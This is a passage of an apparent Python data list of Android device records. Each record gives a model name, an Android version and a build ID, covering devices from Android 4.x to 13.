        {'model': 'C1905', 'android_version': '4.3', 'build': '15.4.A.1.9'},
        {'model': 'CINK SLIM', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'Tab1004', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-N7000', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'Nokia_XL', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I8552B', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'PAP5450DUO', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'LG-E410i', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I9500', 'android_version': '4.2.2', 'build': 'JOP40D'},
        {'model': 'Siru', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'HUAWEI G730-U10', 'android_version': '4.2.2', 'build': 'HuaweiG730-U10'},
        {'model': 'W8s', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'bq Aquaris 5 HD', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'OZZY', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Vodafone Smart 4G', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'QW TB-1517', 'android_version': '4.1.1', 'build': 'JRO03H'},
        {'model': 'ALCATEL C7', 'android_version': '4.2.2', 'build': 'IMO'},
        {'model': 'GT-I9505', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'C5302', 'android_version': '4.3', 'build': '12.1.A.1.207'},
        {'model': 'TAB97QC', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'ONE TOUCH 4033D', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'ME371MG', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'ALEXISRX5DC', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Passport', 'android_version': '4.3', 'build': '10.3.3.213'},
        {'model': 'D2105', 'android_version': '4.3', 'build': '20.0.B.0.84'},
        {'model': 'C2005', 'android_version': '4.2.2', 'build': '15.2.A.2.5'},
        {'model': 'ALCATEL ONE TOUCH 5036D', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'K00F', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'tablet Fnac 7', 'android_version': '4.1.1', 'build': '2.0.0'},
        {'model': 'D2303', 'android_version': '4.3', 'build': '18.0.C.1.17'},
        {'model': 'DARKNIGHT', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'MWG509', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'MID5005', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'rk3026', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'SM-N9005', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'C2105', 'android_version': '4.2.2', 'build': '15.3.A.0.26'},
        {'model': 'SGH-T399', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S6312', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'MEO Smart A68', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'MediaPad 7 Vogue', 'android_version': '4.1.2', 'build': 'HuaweiMediaPad'},
        {'model': 'LG-E455', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'RK-MID', 'android_version': '4.1.1', 'build': 'JRO03H'},
        {'model': 'C2304', 'android_version': '4.2.2', 'build': '16.0.B.2.13'},
        {'model': 'Z750C', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'SGH-T999L', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'uSUN300', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'eZee Tab973', 'android_version': '4.1.1', 'build': 'JRO03H'},
        {'model': 'Optimus_San_Remo', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'GT-I8190N', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I8262', 'android_version': '5.1', 'build': 'JZO54K'},
        {'model': 'GT-P5110', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'HUAWEI G700-T00', 'android_version': '4.2.1', 'build': 'HuaweiG700-T00'},
        {'model': 'SM-A720F', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'Z987', 'android_version': '4.4.4', 'build': 'KTU84P'},
        {'model': 'SM-G950U', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-G925F', 'android_version': '5.1.1', 'build': 'JLS36C'},
        {'model': 'SM-N9005', 'android_version': '7.1.2', 'build': 'NJH47F'},
        {'model': 'CPH1909', 'android_version': '8.1.0', 'build': 'O11019'},
        {'model': 'SM-A205GN', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-A505GN', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'AGS2-L09', 'android_version': '8.0.0', 'build': 'HUAWEIAGS2-L09'},
        {'model': 'LML713DL', 'android_version': '8.1.0', 'build': 'OPM1.171019.019'},
        {'model': 'CPH1987', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'Hisense Hi  3', 'android_version': '7.0', 'build': 'NRD9OM'},
        {'model': 'SM-G930F', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'vivo V3Max', 'android_version': '5.1.1', 'build': 'LMY47V'},
        {'model': 'POT-LX1', 'android_version': '9', 'build': 'HUAWEIPOT-L01'},
        {'model': 'SM-N975U', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-N960F', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'vivo S7i(t)', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Cynus T2', 'android_version': '4.0.4', 'build': 'IMM76D'},
        {'model': 'ZTE Blade A3 2020', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'V2031', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'M2102J20SG', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'PPA-LX3', 'android_version': '10', 'build': 'HUAWEIPPA-LX3'},
        {'model': 'SILVER_MAX', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-A307GT', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'V2058', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'SM-J600GT', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': '21121119VL', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'moto g(8)', 'android_version': '11', 'build': 'RPJS31.Q4U-47-35-17'},
        {'model': 'SM-A525M', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A505G', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-J400M', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'Redmi Note 4', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'moto e5', 'android_version': '8.0.0', 'build': 'OPPS27.91-176-11-16'},
        {'model': 'STK-LX3', 'android_version': '10', 'build': 'HUAWEISTK-LX3'},
        {'model': 'SM-P555M', 'android_version': '6.0.1', 'build': 'MMB29M'},
        {'model': 'Multilaser_GMAX_2', 'android_version': '11', 'build': 'V7_20220401'},
        {'model': 'SM-G570M', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-A217M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'Redmi Note 9 Pro', 'android_version': '12', 'build': 'RKQ1.211019.001'},
        {'model': 'SM-A105M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-A015M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'JAT-LX3', 'android_version': '9', 'build': 'HONORJAT-LX3'},
        {'model': 'moto e5', 'android_version': '8.0.0', 'build': 'OPP27.91-25'},
        {'model': 'CPH2365', 'android_version': '12', 'build': 'RKQ1.211119.001'},
        {'model': 'SM-S727VL', 'android_version': '6.0.1', 'build': 'MMB29M'},
        {'model': 'moto g(9) play', 'android_version': '11', 'build': 'RPXS31.Q2-58-17-7-3'},
        {'model': 'SM-G986B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-A107M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'moto g 5G plus', 'android_version': '11', 'build': 'RPNS31.Q4U-39-27-9-2-9'},
        {'model': 'SM-G965U', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-A326B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': '43DSL-SMART TV-R2', 'android_version': '9', 'build': 'M7332-HUMA-DAEWOO'},
        {'model': 'SM-A715F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-J701MT', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': '2201116SG', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'NOGAPC ULTRA', 'android_version': '7.1.2', 'build': 'NHG47K'},
        {'model': 'M2101K7BNY', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M2007J20CG', 'android_version': '12', 'build': 'SKQ1.211019.001'},
        {'model': '2201117TL', 'android_version': '12', 'build': 'SKQ1.211103.001'},
        {'model': '2201117TY', 'android_version': '12', 'build': 'SKQ1.211103.001'},
        {'model': 'SonyXQ-AD51', 'android_version': '9', 'build': '57.0.A.2.306'},
        {'model': 'M2101K6R', 'android_version': '11', 'build': 'RKQ1.200826.002'},
        {'model': 'moto e6s', 'android_version': '9', 'build': 'POES29.288-60-6-1-29'},
        {'model': 'SM-J610G', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-G780G', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G965F', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-A528B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'NOH-NX9', 'android_version': '10', 'build': 'HUAWEINOH-N29'},
        {'model': 'T766J', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-A205G', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Redmi Note 9 Pro', 'android_version': '12', 'build': 'SKQ1.211019.001'},
        {'model': 'QUAD-CORE H6 petrel-p1', 'android_version': '9', 'build': 'PPR1.181005.003'},
        {'model': 'V2132', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'RMX2155', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'CPH2269', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'motorola one macro', 'android_version': '9', 'build': 'PMDS29.70-85-2'},
        {'model': 'SM-N980F', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'Pixel 6', 'android_version': '13', 'build': 'TQ1A.230105.002'},
        {'model': 'SM-J700M', 'android_version': '6.0.1', 'build': 'MMB29K'},
        {'model': 'M2010J19CG', 'android_version': '11', 'build': 'RKQ1.201004.002'},
        {'model': 'RMX2001', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-G950F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'CPH2205', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'M2003J15SC', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'HRY-LX1', 'android_version': '10', 'build': 'HONORHRY-L21'},
        {'model': 'LM-X210', 'android_version': '7.1.2', 'build': 'N2G47H'},
        {'model': 'X50', 'android_version': '9.0', 'build': 'MRA58K'},
        {'model': 'SM-G998U', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-N975U', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'X95Pro', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'RMX2180', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'RMX3363', 'android_version': '12', 'build': 'RKQ1.210503.001'},
        {'model': '5033D_EEA', 'android_version': '8.1.0', 'build': 'O11019'},
        {'model': 'SM-E236B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-J415G', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-M326B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A705MN', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'Infinix X6826', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G996U1', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'moto g stylus 5G', 'android_version': '12', 'build': 'S2RES32.29-16-1-9'},
        {'model': 'SM-A115M', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-M127F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A536E', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'CPH2127', 'android_version': '12', 'build': 'RKQ1.211119.001'},
        {'model': 'moto g(7) play', 'android_version': '10', 'build': 'QPYS30.52-22-14'},
        {'model': 'CPH2205', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'VNE-LX3', 'android_version': '12', 'build': 'HONORVNE-L43CM'},
        {'model': 'SM-T225', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'moto g(60)s', 'android_version': '12', 'build': 'S3RLS32.114-25-1-1'},
        {'model': '5030A', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'CPH2305', 'android_version': '13', 'build': 'SKQ1.220617.001'},
        {'model': 'SM-A115M', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'MIDNIGHT_SKY', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'SM-A125M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-J260M', 'android_version': '8.1.0', 'build': 'M1AJB'},
        {'model': 'moto e20', 'android_version': '11', 'build': 'RON31.266-41'},
        {'model': '2201117TI', 'android_version': '11', 'build': 'RKQ1.211001.001'},
        {'model': 'JLN-LX1', 'android_version': '11', 'build': 'HUAWEIJLN-LX1'},
        {'model': 'M2006C3LII', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-S908E', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': '2109119DG', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'MI 8 Lite', 'android_version': '9', 'build': 'PKQ1.181007.001'},
        {'model': 'V2050', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'LM-K420', 'android_version': '12', 'build': 'SKQ1.211103.001'},
        {'model': 'SM-G977B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'Multilaser_F', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'MAR-LX3A', 'android_version': '9', 'build': 'HUAWEIMAR-L03A'},
        {'model': 'SM-M127F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'motorola edge 20', 'android_version': '12', 'build': 'S1RGS32.53-18-11-16'},
        {'model': 'SM-G611MT', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'Redmi Note 8', 'android_version': '9', 'build': 'PKQ1.190616.001'},
        {'model': '220333QNY', 'android_version': '11', 'build': 'RKQ1.211001.001'},
        {'model': 'SM-N981B', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'TRT-LX3', 'android_version': '7.0', 'build': 'HUAWEITRT-LX3'},
        {'model': 'Redmi Note 8 Pro', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-G532M', 'android_version': '6.0.1', 'build': 'MMB29T'},
        {'model': 'moto g(9) plus', 'android_version': '11', 'build': 'RPAS31.Q2-59-17-4-5-5'},
        {'model': 'ZTE Blade A5 2020', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'SM-A217F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': '2107113SG', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'W-K510-EEA', 'android_version': '9', 'build': 'PPR1.181008.011'},
        {'model': 'SM-A505G', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'W-K610-FRA', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'motorola one fusion+', 'android_version': '11', 'build': 'RPIS31.Q2-42-25-3'},
        {'model': 'SM-A032M', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'moto g22', 'android_version': '12', 'build': 'STAS32.79-77-28-18-1'},
        {'model': 'M2101K7BL', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'M2102J20SG', 'android_version': '11', 'build': 'RKQ1.200826.002'},
        {'model': 'DSB-0230', 'android_version': '9', 'build': 'S10A_800'},
        {'model': 'SM-T595', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'TECHSMART T6', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'Nokia 5.4', 'android_version': '12', 'build': 'SKQ1.220119.001'},
        {'model': 'SM-A715F', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-T220', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'CPH2271', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'J8210', 'android_version': '9', 'build': '55.0.A.11.25'},
        {'model': 'RMX3242', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'V2038', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'SM-J415FN', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'Pixel 4a', 'android_version': '13', 'build': 'TQ1A.230105.001'},
        {'model': 'ASUS Transformer Pad TF300T', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': '21091116UI', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'I2011', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'moto e5 play', 'android_version': '8.1.0', 'build': 'OPGS28.54-53-8-20'},
        {'model': 'XQ-BC52', 'android_version': '12', 'build': '61.1.A.7.35'},
        {'model': 'Redmi Note 8 Pro', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-A135F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'CPH2211', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SM-A536E', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'CPH2145', 'android_version': '13', 'build': 'TP1A.220905.001'},
        {'model': 'LYA-L29', 'android_version': '10', 'build': 'HUAWEILYA-L29'},
        {'model': 'XQ-BC52', 'android_version': '13', 'build': '61.2.A.0.382'},
        {'model': 'SM-A326B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'LM-X430', 'android_version': '10', 'build': 'QKQ1.200730.002'},
        {'model': 'ELE-L29', 'android_version': '10', 'build': 'HUAWEIELE-L29'},
        {'model': '220333QL', 'android_version': '12', 'build': 'SKQ1.211103.001'},
        {'model': 'SM-A528B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M2101K7BI', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': '2201117TY', 'android_version': '11', 'build': 'RKQ1.211001.001'},
        {'model': 'DRA-L21', 'android_version': '8.1.0', 'build': 'HUAWEIDRA-L21'},
        {'model': 'F-51B', 'android_version': '12', 'build': 'V47RD64B'},
        {'model': 'Infinix X625C', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'V2110', 'android_version': '12', 'build': 'SP1A.210812.003'},
        {'model': 'SM-G991Q', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A105M', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'RMX2193', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'CPH2043', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'YC-83T', 'android_version': '10', 'build': 'QP1A.190711.020.C3'},
        {'model': '6156D', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'SAMSUNG SM-G615FU', 'android_version': '8.1.0', 'build': 'M1AJQ'},
        {'model': 'SM-J600FN', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SKWAMX3', 'android_version': '10', 'build': 'QTT5.200819.003'},
        {'model': 'V2105', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': '2201117SI', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'ASUS_X00TD', 'android_version': '9', 'build': 'PKQ1'},
        {'model': 'SM-J710MN', 'android_version': '8.1.0', 'build': 'M1AJQ'},
        {'model': 'CPH2423', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'TFY-LX3', 'android_version': '11', 'build': 'HONORTFY-L33CQ'},
        {'model': 'PIC-TL00', 'android_version': '8.0.0', 'build': 'HUAWEIPIC-TL00'},
        {'model': 'moto e5 play', 'android_version': '8.1.0', 'build': 'OPGS28.54-19-2'},
        {'model': 'Redmi 7', 'android_version': '10', 'build': 'QKQ1.191008.001'},
        {'model': 'moto e20', 'android_version': '11', 'build': 'RON31.267-88'},
        {'model': 'M2007J17I', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': '22095RA98C', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'PBAM00', 'android_version': '8.1.0', 'build': 'OPM1.171019.026'},
        {'model': 'Moto G (5S)', 'android_version': '8.1.0', 'build': 'OPPS28.65-37-7-11'},
        {'model': 'M2006C3LG', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Mozilla/5.0 (Linux', 'android_version': '10.0', 'build': 'QTG3.200617.002'},
        {'model': 'moto g(30)', 'android_version': '11', 'build': 'RRCS31.Q1-3-68-2'},
        {'model': 'SM-J260MU', 'android_version': '8.1.0', 'build': 'M1AJB'},
        {'model': 'moto g(20)', 'android_version': '11', 'build': 'RTAS31.68-66-1'},
        {'model': 'Redmi Note 9 Pro', 'android_version': '11', 'build': 'RKQ1.200826.002'},
        {'model': 'moto g(9) plus', 'android_version': '13', 'build': 'TD1A.221105.003'},
        {'model': 'SM-A105M', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'ASUS_X00TDB', 'android_version': '8.1.0', 'build': 'OPM1'},
        {'model': 'moto g(7)', 'android_version': '10', 'build': 'QPUS30.52-33-11'},
        {'model': 'SM-A022M', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'MAR-LX3A', 'android_version': '10', 'build': 'HUAWEIMAR-L03A'},
        {'model': 'LG-H870I', 'android_version': '8.0.0', 'build': 'OPR1.170623.032'},
        {'model': 'ASUS_A007', 'android_version': '6.0.1', 'build': 'MMB29P'},
        {'model': 'Moto Z (2)', 'android_version': '9', 'build': 'PPX29.159-24'},
        {'model': 'MH-T6000', 'android_version': '11', 'build': 'MH-T6000V1.0.0B009'},
        {'model': 'SM-A217M', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-S908B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-G990W2', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': '100011885', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'moto g41', 'android_version': '11', 'build': 'RRWS31.Q3-41-80-12'},
        {'model': 'STK-L22', 'android_version': '10', 'build': 'HUAWEISTK-L22'},
        {'model': '21091116AG', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'M2006C3MG', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-A037M', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'CPH2145', 'android_version': '12', 'build': 'RKQ1.211103.002'},
        {'model': 'SM-A530F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-A205U', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'W-K130-EEA', 'android_version': '8.1.0', 'build': 'OPM2.171019.012'},
        {'model': 'SM-A202F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'RMX2170', 'android_version': '12', 'build': 'SKQ1.210216.001'},
        {'model': 'TBT8A10', 'android_version': '10', 'build': 'QQ2A.200305.004.A1'},
        {'model': 'M2103K19PG', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'Lenovo K33b36', 'android_version': '7.0', 'build': 'NRD90N'},
        {'model': 'SM-G955U', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-A705U', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'M-MPA10E', 'android_version': '5.1', 'build': 'LMY47I'},
        {'model': 'SM-T510', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'Redmi Note 8T', 'android_version': '9', 'build': 'PKQ1.190616.001'},
        {'model': 'SM-G780F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G975F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G780G', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'Mi 11i', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'Redmi Note 7 Pro', 'android_version': '10', 'build': 'QKQ1.190915.002'},
        {'model': 'Redmi Note 5 Pro', 'android_version': '9', 'build': 'PKQ1.180904.001'},
        {'model': 'CPH2381', 'android_version': '12', 'build': 'RKQ1.211119.001'},
        {'model': 'CPH2211', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'C55 Pro', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'moto g(7) power', 'android_version': '10', 'build': 'QPOS30.52-29-12'},
        {'model': 'Moto G (5) Plus', 'android_version': '7.0', 'build': 'NPNS25.137-92-10'},
        {'model': 'SM-A415F', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'moto g 5G', 'android_version': '11', 'build': 'RZKS31.Q3-25-15-9'},
        {'model': 'Moto Z3 Play', 'android_version': '9', 'build': 'PPWS29.131-27-1-27'},
        {'model': 'moto e30', 'android_version': '11', 'build': 'ROP31.166-72'},
        {'model': 'SM-G610M', 'android_version': '7.0', 'build': 'NRD90M'},
        {'model': 'Redmi 6A', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'ASUS_A001D', 'android_version': '8.1.0', 'build': 'OPM1'},
        {'model': 'SNE-LX1', 'android_version': '10', 'build': 'HUAWEISNE-L21'},
        {'model': 'Moto X Play', 'android_version': '7.1.1', 'build': 'NPD26.48-24-1'},
        {'model': 'SM-J600GT', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'ANE-LX2', 'android_version': '9', 'build': 'HUAWEIANE-L22'},
        {'model': 'SM-M526B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'Moto E (4)', 'android_version': '7.1.1', 'build': 'NMA26.42-169'},
        {'model': 'M1036', 'android_version': '11', 'build': 'RP1A.201005.001'},
        {'model': 'SM-G935F', 'android_version': '6.0.1', 'build': 'MMB29K'},
        {'model': '5024D_EEA', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'Pixel 4a', 'android_version': '13', 'build': 'TQ1A.221205.011.B1'},
        {'model': 'SM-J105M', 'android_version': '5.1.1', 'build': 'LMY47V'},
        {'model': 'motorola one', 'android_version': '10', 'build': 'QPKS30.54-22-27'},
        {'model': '6102H', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'TECNO CI7n', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A315G', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M2004J19C', 'android_version': '11', 'build': 'RP1A.200720.011'},
        {'model': 'Nokia C31', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'Mi A2', 'android_version': '10', 'build': 'QKQ1.190910.002'},
        {'model': 'M2101K9C', 'android_version': '11', 'build': 'RKQ1.201112.002'},
        {'model': 'Xiaomi 12X', 'android_version': '11', 'build': 'RKQ1.200826.002'},
        {'model': 'M2101K6G', 'android_version': '12', 'build': 'SKQ1.210908.001'},
        {'model': 'SM-T509', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'M2007J3SG', 'android_version': '13', 'build': 'TQ1A.230105.002'},
        {'model': 'AGS-L09', 'android_version': '7.0', 'build': 'HUAWEIAGS-L09'},
        {'model': 'EB2103', 'android_version': '12', 'build': 'RKQ1.211119.001'},
        {'model': 'SM-A920F', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-A202F', 'android_version': '9', 'build': 'PPR1.180610.011'},
        {'model': 'SM-M315F', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'moto e(6i)', 'android_version': '10', 'build': 'QOHS30.280-19-16'},
        {'model': 'M2004J19C', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'T671H', 'android_version': '12', 'build': 'SKQ1.211006.001'},
        {'model': 'Nokia 7.2', 'android_version': '11', 'build': 'RKQ1.210607.001'},
        {'model': 'SM-J410G', 'android_version': '8.1.0', 'build': 'M1AJB'},
        {'model': 'Tab 15', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'moto e(7) power', 'android_version': '10', 'build': 'QOLS30.288-52-12'},
        {'model': 'Tab8', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'Redmi 5', 'android_version': '7.1.2', 'build': 'N2G47H'},
        {'model': 'moto g stylus (2021)', 'android_version': '10', 'build': 'QPC30.Q4-31-26-1'},
        {'model': 'RMX1971', 'android_version': '11', 'build': 'RKQ1.201217.002'},
